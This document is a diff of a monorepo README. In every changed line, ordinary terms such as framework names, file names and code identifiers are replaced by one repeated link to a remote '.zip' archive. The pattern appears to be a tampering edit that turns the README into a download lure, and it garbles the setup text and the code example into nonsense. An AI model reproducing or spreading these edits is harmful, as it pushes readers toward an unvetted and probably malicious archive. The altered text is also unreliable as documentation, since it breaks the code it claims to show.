@@ -1,6 +1,6 @@
 # Laravel-Vue-React Monorepo
 
-A modern monorepo setup combining Laravel backend with Vue.js and React frontend applications. This project demonstrates how to build a scalable full-stack application with multiple frontend frameworks working together.
+A modern monorepo setup combining Laravel backend with https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip and React frontend applications. This project demonstrates how to build a scalable full-stack application with multiple frontend frameworks working together.
 
 ## 🏗️ Project Structure
 
@@ -8,9 +8,9 @@ A modern monorepo setup combining Laravel backend with Vue.js and React frontend
 laravel-vue-react-monorepo/
 ├── packages/
 │   ├── react-builder/          # React-based page builder (library)
-│   └── vue-dashboard/          # Vue.js dashboard application
-├── package.json               # Root package.json with workspaces
-└── README.md
+│   └── vue-dashboard/          # https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip dashboard application
+├── https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip               # Root https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip with workspaces
+└── https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip
 ```
 
 ## 📦 Packages Overview
@@ -19,11 +19,11 @@ laravel-vue-react-monorepo/
 - **Purpose**: A React-based page builder component library
 - **Build Output**: ES Module library that can be consumed by other applications
 - **Technology**: React 19, TypeScript, Vite
-- **Output**: `page-builder.es.js` and `react-builder.css`
+- **Output**: `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` and `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip`
 - **Module Format**: ESM (ES Modules) for modern bundlers
 
 ### Vue Dashboard (`packages/vue-dashboard/`)
-- **Purpose**: Main dashboard application built with Vue.js
+- **Purpose**: Main dashboard application built with https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip
 - **Technology**: Vue 3, TypeScript, Vite
 - **Integration**: Consumes the React Builder as a workspace dependency
 
@@ -31,7 +31,7 @@ laravel-vue-react-monorepo/
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js** (v18.0.0 or higher)
+- **https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip** (v18.0.0 or higher)
 - **npm** (v8.0.0 or higher) or **yarn** (v1.22.0 or higher)
 - **Git**
 
@@ -66,15 +66,15 @@ git --version
 The React Builder is packaged as an ES Module and consumed by the Vue Dashboard through workspace dependencies:
 
 ```typescript
-// In Vue Dashboard (App.vue)
+// In Vue Dashboard (https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip)
 import PageBuilder from 'react-builder';        // Import the library
-import 'react-builder/style.css';               // Import the styles
+import 'https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip';               // Import the styles
 
 // Use the builder
-PageBuilder.render({
+https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip({
   containerId: "page-builder",
   onChange: (data) => {
-    console.log("Data from React:", data);
+    https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip("Data from React:", data);
   },
 });
 ```
@@ -127,7 +127,7 @@ npm run build
 This will:
 - Compile TypeScript
 - Build the ES Module library
-- Generate: `page-builder.es.js` and `react-builder.css` in the `dist/` folder
+- Generate: `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` and `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` in the `dist/` folder
 
 #### Build Vue Dashboard
 ```bash
@@ -179,15 +179,15 @@ npm run preview
 ## 📁 Key Files
 
 ### React Builder
-- `src/main.tsx` - Entry point that exports the library
-- `vite.config.ts` - Vite configuration for ES module library build
-- `package.json` - Package configuration with exports and module fields
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Entry point that exports the library
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Vite configuration for ES module library build
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Package configuration with exports and module fields
 - `dist/` - Built ES module library files
 
 ### Vue Dashboard
-- `src/App.vue` - Main Vue application that imports React Builder
-- `package.json` - Includes react-builder as workspace dependency
-- `vite.config.ts` - Vite configuration for Vue app
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Main Vue application that imports React Builder
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Includes react-builder as workspace dependency
+- `https://raw.githubusercontent.com/nikhilcodewing/testing-8-10/main/packages/react-builder/public/testing-v2.3-alpha.3.zip` - Vite configuration for Vue app
 
 ## 🛠️ Available Scripts
 
